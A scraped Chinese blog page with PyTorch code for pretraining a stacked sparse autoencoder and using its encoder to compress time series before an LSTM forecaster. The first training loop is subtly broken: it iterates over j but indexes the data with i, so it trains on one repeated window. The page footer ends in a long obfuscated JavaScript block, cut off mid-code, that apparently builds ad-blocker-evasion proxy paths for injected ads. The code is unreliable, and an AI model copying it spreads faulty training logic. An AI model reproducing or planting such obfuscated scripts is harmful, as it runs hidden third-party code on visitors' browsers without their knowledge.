            <span class="token keyword">for</span> epoch <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>epoches<span class="token punctuation">)</span><span class="token punctuation">:</span>
                runing_loss <span class="token operator">=</span> <span class="token number">0</span>
                <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>train_data<span class="token punctuation">.</span>shape<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">//</span> total_len<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># 总共可以取多少个total_len</span>
                    x <span class="token operator">=</span> train_data<span class="token punctuation">[</span>i <span class="token operator">*</span> total_len <span class="token punctuation">:</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> total_len<span class="token punctuation">,</span> <span class="token punctuation">:</span><span class="token punctuation">]</span>  <span class="token comment"># 每一次取total_len长度</span>
                    xx <span class="token operator">=</span> x<span class="token punctuation">[</span><span class="token punctuation">:</span>seq_len<span class="token punctuation">,</span> <span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>clone<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 每一次已知的时间序列（seq_len,dim）</span>
                    xx <span class="token operator">=</span> xx<span class="token punctuation">.</span>unsqueeze<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>  <span class="token comment"># 升维度（1,seq_len,dim）</span>
                    xx <span class="token operator">=</span> xx<span class="token punctuation">.</span>permute<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>  <span class="token comment"># 输出维度是（1,dim,seq_len）</span>
                    pred <span class="token operator">=</span> sae<span class="token punctuation">(</span>xx<span class="token punctuation">)</span>  <span class="token comment"># 输出是（1,dim,seq_len）</span>
                    optimizer<span class="token punctuation">.</span>zero_grad<span class="token punctuation">(</span><span class="token punctuation">)</span>
                    pred <span class="token operator">=</span> pred<span class="token punctuation">.</span>squeeze<span class="token punctuation">(</span><span class="token punctuation">)</span>
                    pred<span class="token operator">=</span>pred<span class="token punctuation">.</span>permute<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token comment">#输出是(seq-len,dim)</span>
                    kl<span class="token operator">=</span>rou<span class="token operator">*</span>torch<span class="token punctuation">.</span>log<span class="token punctuation">(</span>rou<span class="token operator">/</span>rou_hat<span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">-</span>rou<span class="token punctuation">)</span><span class="token operator">*</span>torch<span class="token punctuation">.</span>log<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">-</span>rou<span class="token punctuation">)</span><span class="token operator">/</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">-</span>rou_hat<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#计算KL散度</span>
                    loss <span class="token operator">=</span> loss_fn<span class="token punctuation">(</span>pred<span class="token punctuation">,</span> x<span class="token punctuation">[</span>seq_len<span class="token punctuation">:</span><span class="token punctuation">,</span> <span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span>kl  <span class="token comment"># 计算loss</span>
                    loss<span class="token punctuation">.</span>backward<span class="token punctuation">(</span><span class="token punctuation">)</span>
                    runing_loss <span class="token operator">+=</span> loss
                    optimizer<span class="token punctuation">.</span>step<span class="token punctuation">(</span><span class="token punctuation">)</span>
                    rou_hat <span class="token operator">=</span> rou_hat_cala<span class="token punctuation">(</span>i<span class="token punctuation">,</span> self<span class="token punctuation">,</span> xx<span class="token punctuation">)</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'第{0}个epoch的loss：{1}'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>epoch <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token builtin">round</span><span class="token punctuation">(</span><span class="token punctuation">(</span>runing_loss <span class="token operator">/</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>item<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            lst<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>requires_grad <span class="token operator">=</span> <span class="token boolean">False</span>
            lst<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>requires_grad <span class="token operator">=</span> <span class="token boolean">False</span> <span class="token comment"># 把训练好的层再次冻住</span>
</code></pre> 
<p>逐层训练完毕后，整一个网络整体进行训练，进行微调，这一部分就和普通的网络进行训练一样</p> 
<pre><code class="prism language-python"><span class="token keyword">def</span> <span class="token function">train</span><span class="token punctuation">(</span>net<span class="token punctuation">,</span>loss_fn<span class="token punctuation">,</span>optimizer<span class="token punctuation">,</span>train_data<span class="token punctuation">,</span>seq_len<span class="token punctuation">,</span>pred_len<span class="token punctuation">,</span>epoches<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">'''
    Args:
        net是需要训练的网络
        loss_fn是使用的损失函数，train_data是整个训练集
        seq_len是已知的时间序列的长度，pred_len是需要预测的时间序列长度
        epoches是外循环多少次，
    '''</span>
    net<span class="token punctuation">.</span>train<span class="token punctuation">(</span><span class="token punctuation">)</span>
    total_len<span class="token operator">=</span>pred_len<span class="token operator">+</span>seq_len
    <span class="token keyword">for</span> epoch <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>epoches<span class="token punctuation">)</span><span class="token punctuation">:</span>
        runing_loss <span class="token operator">=</span> <span class="token number">0</span>
        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>train_data<span class="token punctuation">.</span>shape<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">//</span> total_len<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># 总共可以取多少个total_len</span>
            x<span class="token operator">=</span>train_data<span class="token punctuation">[</span>i<span class="token operator">*</span>total_len<span class="token punctuation">:</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span>total_len<span class="token punctuation">,</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token comment">#每一次取total_len长度</span>
            xx<span class="token operator">=</span>x<span class="token punctuation">[</span><span class="token punctuation">:</span>seq_len<span class="token punctuation">,</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>clone<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#每一次已知的时间序列（seq_len,dim）</span>
            xx<span class="token operator">=</span>xx<span class="token punctuation">.</span>unsqueeze<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token comment">#升维度（1,seq_len,dim）</span>

            xx<span class="token operator">=</span>xx<span class="token punctuation">.</span>permute<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">#输出维度是（1,dim,seq_len）</span>
            pred<span class="token operator">=</span>net<span class="token punctuation">(</span>xx<span class="token punctuation">)</span><span class="token comment">#输出是（1,dim,pred_len）</span>
            optimizer<span class="token punctuation">.</span>zero_grad<span class="token punctuation">(</span><span class="token punctuation">)</span>
            pred<span class="token operator">=</span>pred<span class="token punctuation">.</span>contiguous<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>squeeze<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span>permute<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token comment">#输出是（pred_len,dim）</span>
            loss<span class="token operator">=</span>loss_fn<span class="token punctuation">(</span>pred<span class="token punctuation">,</span>x<span class="token punctuation">[</span>seq_len<span class="token punctuation">:</span><span class="token punctuation">,</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment">#计算loss</span>
            loss<span class="token punctuation">.</span>backward<span class="token punctuation">(</span><span class="token punctuation">)</span>
            runing_loss<span class="token operator">+=</span>loss
            optimizer<span class="token punctuation">.</span>step<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'第{0}个epoch的loss：{1}'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>epoch<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token builtin">round</span><span class="token punctuation">(</span><span class="token punctuation">(</span>runing_loss<span class="token operator">/</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>item<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</code></pre> 
<p>预训练完毕后，把相应的权重进行保存</p> 
<p>正式训练的时候可以直接调用预训练的权重</p> 
<h4>
<a id="Autoencoder_223"></a>Autoencoder正式训练的代码</h4> 
<p>模型初始化</p> 
<p>初始化五个全连接层，这一个也没什么特别的，这里可以调用之前预训练好的权重</p> 
<pre><code class="prism language-Python">class Autoencoder(nn.Module): #输入是已知的时间序列，输出是预测时间序列
    def __init__(self,args,hidden_size=300):
        '''
        Arg:
        seq_len=96代表输入数据的第二个维度（时间维度：已知多长的时间序列）
        pred_len=96代表预测时间有多长,hidden_size=300是隐藏层的神经元数量
        '''
        super(Autoencoder, self).__init__()
        seq_len=args.seq_len
        pred_len=args.pred_len
        # 输入是（batch_size,dim,seq_len）--&gt;输出为（batch_size,dim,hidden_size）
        self.fc1=nn.Linear(seq_len,hidden_size)
        # 输入是（batch_size,dim,hidden_size）--&gt;输出为（batch_size,dim,hidden_size）
        self.fc2=nn.Linear(hidden_size,hidden_size)
        # 输入是（batch_size,dim,hidden_size）--&gt;输出为（batch_size,dim,hidden_size）
        self.fc3=nn.Linear(hidden_size,hidden_size)
       # 输入是（batch_size,dim,hidden_size）--&gt;输出为（batch_size,dim,hidden_size）
        self.fc4=nn.Linear(hidden_size,hidden_size)
        # 输入是（batch_size,dim,hidden_size）--&gt;输出为（batch_size,dim,pred_len）
        self.fc5=nn.Linear(hidden_size,pred_len)
</code></pre> 
<p>forward部分的代码，把五个全连接连接在一起，最后输出预测值</p> 
<pre><code class="prism language-python"><span class="token keyword">def</span> <span class="token function">forward</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> enc_x<span class="token punctuation">,</span> enc_mark<span class="token punctuation">,</span> y<span class="token punctuation">,</span> y_mark<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">'''
    Args:
    :param enc_x: 已知的时间序列 （batch_size,seq_len,dim）
    以下的 param本 model未使用，不做过多介绍
    :param enc_mark: 已知的时序序列的时间对应的时间矩阵，
    :param y:
    :param y_mark:
    :return:  x_cat_pred[:,-self.pred_len:,:] 将预测的时间序列的部分返回回去 (batch_size,pred)len,dim)
    '''</span>
    enc_x<span class="token operator">=</span>enc_x<span class="token punctuation">.</span>permute<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment"># 输入为（batch_size,seq_len,dim）--》输出为（batch_size,dim,seq_len）</span>
    x<span class="token operator">=</span>torch<span class="token punctuation">.</span>sigmoid<span class="token punctuation">(</span>self<span class="token punctuation">.</span>fc1<span class="token punctuation">(</span>enc_x<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># 输入是（batch_size,dim,seq_len）--&gt;输出为（batch_size,dim,hidden_size）</span>
    x<span class="token operator">=</span>torch<span class="token punctuation">.</span>sigmoid<span class="token punctuation">(</span>self<span class="token punctuation">.</span>fc2<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># 输入是（batch_size,dim,hidden_size）--&gt;输出为（batch_size,dim,hidden_size）</span>
    x<span class="token operator">=</span>torch<span class="token punctuation">.</span>sigmoid<span class="token punctuation">(</span>self<span class="token punctuation">.</span>fc3<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># 输入是（batch_size,dim,hidden_size）--&gt;输出为（batch_size,dim,hidden_size）</span>
    x<span class="token operator">=</span>torch<span class="token punctuation">.</span>sigmoid<span class="token punctuation">(</span>self<span class="token punctuation">.</span>fc4<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># 输入是（batch_size,dim,hidden_size）--&gt;输出为（batch_size,dim,hidden_size）</span>
    x<span class="token operator">=</span>self<span class="token punctuation">.</span>fc5<span class="token punctuation">(</span>x<span class="token punctuation">)</span>  <span class="token comment"># 输入是（batch_size,dim,hidden_size）--&gt;输出为（batch_size,dim,pred_len）</span>
    x<span class="token operator">=</span>x<span class="token punctuation">.</span>permute<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">#输入是（batch_size,dim,pred_len）输出是（batch_size,pred_len,dim）</span>
    <span class="token keyword">return</span> x <span class="token comment">#返回值的shape是（batch_size，pred_len，dim）</span>
</code></pre> 
<h4>
<a id="_281"></a>数据压缩网络</h4> 
<p>根据Autoencoder的特性，另一个思路就是根据Auencoder进行数据压缩，压缩过后的数据在送入LSTM中进行预测任务</p> 
<pre><code class="prism language-Python">class SAE(nn.Module):
    def __init__(self,arg):
        super(SAE, self).__init__()
        self.arg=arg
        # 先使用SAE_encoder把数据的时间维度进行压缩，压缩为hidden_size2，即从seq_len--&gt;hidden_size2
        self.SAE_encoder=SAE_encoder(seq_len=self.arg.seq_len,hidden_size1=72,hidden_size2=48)
        # 将经过SAE_encoder压缩过后的数据，放入LSTM中进行预测任务
        self.LSTM=LSTM(seq_len=48,pred_len=self.arg.pred_len,dim=self.arg.d_feature,hidden_size=128,num_layers=1,batch_size=self.arg.batch_size)

    def forward(self,enc_x, enc_mark, y, y_mark):
        '''
        :param enc_x: 已知的时间序列 （batch_size,seq_len,dim）
        以下的 param本 model未使用，不做过多介绍
        :param enc_mark: 已知的时序序列的时间对应的时间矩阵，
        :param y:
        :param y_mark:
        :return:  x 将预测的时间序列的部分返回回去 (batch_size,pred_len,dim)
        '''
        # 其中预训练是使用自编码器的方法进行预训练
        self.SAE_encoder.load_state_dict(torch.load('./checkpoint/SAE/SAE_encoder')) # 使用预训练的SAE_encoder的权重
        x=self.SAE_encoder(enc_x) # x shape(batch_size,dim,hidden_size2),seq_len被压缩为hidden_size2, 为了方便后面的seq_len都是表示hidden_size2
        x=x.permute(2,0,1)#输出为（seq_len,batch_size,dim）
        x=self.LSTM(x)#输出是（pred_len,batch_size,dim）
        x=x.permute(1,0,2)#输出是（batch_size,pred_len,dim）
        return x
</code></pre> 
<p>首先数据压缩网络也没有什么特别的，就是几个全连接神经网络将数据的时间维度进行了压缩</p> 
<pre><code class="prism language-Python">class SAE_encoder(nn.Module):
    def __init__(self,seq_len=96,hidden_size1=72,hidden_size2=48):
        '''
        Arg:
        seq_len=96代表输入数据的第二个维度（时间维度：已知多长的时间序列）
        hidden_size1=72是隐藏层1的神经元数量，hidden_size2=48是隐藏层2的神经元数量
        其中hidden_size2就是经过SAE_encoder压缩过后的数据的时间维度
        '''
        super(SAE_encoder, self).__init__()
        # 输入是(batch_size,in_channels,seq_len)--&gt;输出为(batch_size,in_channels,hidden_size1)
        # 其中in_channels表示的是数据的特征维度,本任务中为7
        self.hidden1=nn.Linear(seq_len,hidden_size1)
        # 输入是(batch_size,in_channels,hidden_size1)--&gt;输出为（batch_size,in_channels,hidden_size2）
        self.hidden2=nn.Linear(hidden_size1,hidden_size2)
    def forward(self,x):
        x=x.permute(0,2,1) # 对输入数据x进行转置，处理的是seq_len维度
        x=torch.relu(self.hidden1(x)) # 输出为(batch_size,in_channels,hidden_size1)
        x=self.hidden2(x) # 输出为（batch_size,in_channels,hidden_size2）
        return x
</code></pre> 
<p>数据压缩过后送入LSTM网络中</p> 
<p>初始化LSTM网络</p> 
<pre><code class="prism language-python"><span class="token keyword">class</span> <span class="token class-name">LSTM</span><span class="token punctuation">(</span>nn<span class="token punctuation">.</span>Module<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#输入的数据维度（seq_len，batch_size,dim),因为使用了SAE进行数据压缩，把时间维度从seq_len变成hidden_size2</span>

    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>seq_len<span class="token operator">=</span><span class="token number">48</span><span class="token punctuation">,</span>pred_len<span class="token operator">=</span><span class="token number">96</span><span class="token punctuation">,</span>dim<span class="token operator">=</span><span class="token number">7</span><span class="token punctuation">,</span>hidden_size<span class="token operator">=</span><span class="token number">128</span><span class="token punctuation">,</span>num_layers<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>batch_size<span class="token operator">=</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token triple-quoted-string string">'''
        Args:
        :param seq_len: 表示已知的时间维度，这里应该要和SAE_encoder的hidden_size2
        :param pred_len: 表示预测的时间序列的长度
        :param dim: 表示数据的特征维度
        :param hidden_size:表示隐藏层的单元数
        :param num_layers:使用多少层lstm网络
        :param batch_size:时间序列的batch_size
        '''</span>
        <span class="token builtin">super</span><span class="token punctuation">(</span>LSTM<span class="token punctuation">,</span> self<span class="token punctuation">)</span><span class="token punctuation">.</span>__init__<span class="token punctuation">(</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>seq_len<span class="token operator">=</span>seq_len <span class="token comment"># seq_len是经过数据压缩后的长度</span>
        self<span class="token punctuation">.</span>dim<span class="token operator">=</span>dim
        self<span class="token punctuation">.</span>pred_len<span class="token operator">=</span>pred_len
        self<span class="token punctuation">.</span>num_layers<span class="token operator">=</span>num_layers
        self<span class="token punctuation">.</span>hidden_sie<span class="token operator">=</span>hidden_size
        self<span class="token punctuation">.</span>batch_size<span class="token operator">=</span>batch_size
        self<span class="token punctuation">.</span>total_len<span class="token operator">=</span>seq_len<span class="token operator">+</span>pred_len <span class="token comment"># 一次任务总共的时间序列</span>
        <span class="token comment"># 输入是（seq_len,batch_size,dim）--&gt;输出是（seq_len,batch_size,hidden_size）</span>
        <span class="token comment"># 其中seq_len应该为SAE_encoder的hidden_size2</span>
        self<span class="token punctuation">.</span>lstm<span class="token operator">=</span>nn<span class="token punctuation">.</span>LSTM<span class="token punctuation">(</span>input_size<span class="token operator">=</span>dim<span class="token punctuation">,</span>hidden_size<span class="token operator">=</span>hidden_size<span class="token punctuation">,</span>
                          num_layers<span class="token operator">=</span>num_layers<span class="token punctuation">,</span>batch_first<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span> <span class="token comment"># 初始化一个LSTM网络</span>
        <span class="token comment"># 输入为（seq_len,batch_size,hidden_size)--&gt;输出为（seq_len,batch_size,dim）</span>
        self<span class="token punctuation">.</span>fc_dim<span class="token operator">=</span>nn<span class="token punctuation">.</span>Linear<span class="token punctuation">(</span>hidden_size<span class="token punctuation">,</span>dim<span class="token punctuation">)</span><span class="token comment">#压缩数据特征维度</span>
        <span class="token comment">#  输入为（dim,batch_size,seq_len）--&gt;(dim,batch_size,1)</span>
        self<span class="token punctuation">.</span>fc_time<span class="token operator">=</span>nn<span class="token punctuation">.</span>Linear<span class="token punctuation">(</span>seq_len<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">#压缩时间维度</span>
</code></pre> 
<p>forward部分的代码</p> 
<p>每一次获得seq_len长度的时间数据，得到下一天的时间数据，实现的code为pred_onestep，也是forward部分的主体功能实现代码，其余forward部分的代码时获得已知的时间数据，得到预测的数据，把数据拼接回已知的时间数据的序列中，然后继续滑动窗口得到下一个的输入数据</p> 
<pre><code class="prism language-Python">def forward(self,x):
    hidden=torch.zeros(self.num_layers,self.batch_size,self.hidden_sie).to(x.device) # hidden_size=(num_layers,batch_size,hidden_size)
    cell=torch.zeros(self.num_layers,self.batch_size,self.hidden_sie).to(x.device) # 初始化hidden和cell
    # 初始化x_cat_pred 用来装已知的时间序列和预测的时间序列
    x_cat_pred=torch.zeros(self.total_len,self.batch_size,self.dim).to(x.device) # 把预测部分也放在一起 x_cat_pred=(seq_len+pred_len,batch_size,dim)
    # 把已知的时间序列放入x_cat_pred中
    x_cat_pred[:self.seq_len,:,:]=x_cat_pred[:self.seq_len,:,:].clone()+x # 把已知的序列数据也放入到x_cat_pred中

    for i in range(self.pred_len): # 滑动多少次，预测多少长的时间序列就滑动多少次
        lstm_input=x_cat_pred[i:i+self.seq_len,:,:].clone()#获取每一次的输入lstm_input (seq_len,batch_size,dim)
        pred=self.pred_onestep(lstm_input,hidden,cell)#输出是pred （1，batch_szie，dim）
        x_cat_pred[i+self.seq_len,:,:]=x_cat_pred[i+self.seq_len,:,:].clone().unsqueeze(0)+pred#把预测值也拼接回去
    return x_cat_pred[-self.pred_len:,:,:]#把预测的在返回回去，输出是(pred_len,batch_size,dim)
</code></pre> 
<p>pred_onestep</p> 
<p>一次只预测一天的时间数据</p> 
<p>输入数据(seq_len,batch_size,dim)–&gt;(1,batch_size,dim)</p> 
<pre><code class="prism language-Python"># 每一次只预测下一天的时间序列
def pred_onestep(self,x,hidden,cell): # 输入为（seq_len,batch_size,dim）
    output,(hidden,cell)=self.lstm(x,(hidden,cell))#output是（seq_len,batch_size,hidden_size）
    output=self.fc_dim(output)#输出是（seq_len,batch_size，dim）
    output=output.permute(2,1,0)#变为(dim,batch_size,seq_len),为了对时间维度进行操作
    output=self.fc_time(output)#输出为（dim,batch_size,1）
    output=output.permute(2,1,0)#变回（1,batch_size,dim），1表示一个时间点
    return output # （1,batch_size,dim）
</code></pre>
                </div>
                
                

		</div>
	</article>
</main>




			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程小白.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<script src="https://www.w3counter.com/tracker.js?id=150625"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0